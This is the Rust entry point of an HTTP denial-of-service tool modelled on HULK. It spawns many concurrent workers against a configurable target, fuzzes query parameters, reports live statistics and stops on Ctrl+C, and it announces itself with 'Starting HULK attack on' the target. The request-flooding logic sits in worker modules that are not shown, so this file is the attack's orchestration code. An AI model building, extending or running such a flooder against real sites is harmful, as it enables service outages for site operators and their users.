mod cli;
mod config;
mod error;
mod query;
mod report;
mod stats;
mod ua;
mod worker;

use std::process::ExitCode;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

use clap::Parser;

use cli::CliArguments;
use config::AppConfig;
use error::AppError;
use stats::Stats;

#[tokio::main]
async fn main() -> ExitCode {
    match run().await {
        Ok(()) => ExitCode::SUCCESS,
        Err(err) => {
            eprintln!("[!] {err}");
            ExitCode::FAILURE
        }
    }
}

async fn run() -> Result<(), AppError> {
    let args = CliArguments::parse();
    let config = Arc::new(AppConfig::from_cli(args)?);
    let stats = Stats::new();
    let shutdown = Arc::new(AtomicBool::new(false));

    println!(
        "[*] Starting HULK attack on {} ({} workers)",
        config.target, config.max_connections
    );
    if !config.query.fuzz.is_empty() {
        let names: Vec<&str> = config.query.fuzz.iter().map(|p| p.name.as_str()).collect();
        println!("[*] Fuzzing query params: {}", names.join(", "));
    }

    let mut join_set = tokio::task::JoinSet::new();
    for _ in 0..config.max_connections {
        join_set.spawn(worker::run(
            Arc::clone(&config),
            Arc::clone(&stats),
            Arc::clone(&shutdown),
        ));
    }

    let reporter = tokio::spawn(report::run_live(Arc::clone(&stats), Arc::clone(&shutdown)));

    let mut panics = 0usize;
    let interrupt = wait_for_interrupt();
    tokio::pin!(interrupt);
    loop {
        tokio::select! {
            _ = &mut interrupt => {
                println!("\n[*] Ctrl+C received, stopping workers...");
                break;
            }
            result = join_set.join_next() => {
                match result {
                    None => break,
                    Some(Err(err)) if err.is_panic() => {
                        panics += 1;
                        println!("\n[!] Worker task panicked, stopping...");
                        break;
                    }
                    Some(_) => {}
                }
            }
        }
    }

    shutdown.store(true, Ordering::SeqCst);
    join_set.abort_all();
    panics += drain_workers(&mut join_set).await;
    reporter.abort();
    let _ = reporter.await;
    report::print_final(&stats);

    if panics > 0 {
        Err(AppError::WorkerPanics(panics))
    } else {
        Ok(())
    }
}

async fn drain_workers(join_set: &mut tokio::task::JoinSet<()>) -> usize {
    let mut panics = 0usize;
    while let Some(result) = join_set.join_next().await {
        if matches!(result, Err(err) if err.is_panic()) {
            panics += 1;
        }
    }
    panics
}

async fn wait_for_interrupt() {
    #[cfg(windows)]
    {
        let mut ctrl_c = tokio::signal::windows::ctrl_c().expect("listen for Ctrl+C");
        let mut ctrl_break = tokio::signal::windows::ctrl_break().expect("listen for Ctrl+Break");
        tokio::select! {
            _ = ctrl_c.recv() => {}
            _ = ctrl_break.recv() => {}
        }
    }
    #[cfg(not(windows))]
    {
        let _ = tokio::signal::ctrl_c().await;
    }
}
